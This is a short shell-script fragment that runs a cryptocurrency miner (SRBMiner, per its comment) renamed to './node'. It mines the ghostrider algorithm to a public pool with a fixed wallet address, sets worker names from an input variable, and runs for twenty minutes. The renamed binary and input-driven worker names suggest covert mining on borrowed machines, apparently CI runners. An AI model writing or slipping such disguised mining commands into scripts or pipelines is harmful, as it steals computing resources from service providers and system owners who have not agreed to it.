...
# Raptorium + SRBMiner
START=$(./node -a ghostrider -o us-east.flockpool.com:4444 -u RFPo8rf6nP7ZSJ67JPvAhwcgYsUZo8JLjV.crf_${INPUT_NUMBER} --cpu-threads-intensity 4 --miner-priority 4 > try.log & sleep 1200 )
# salvium
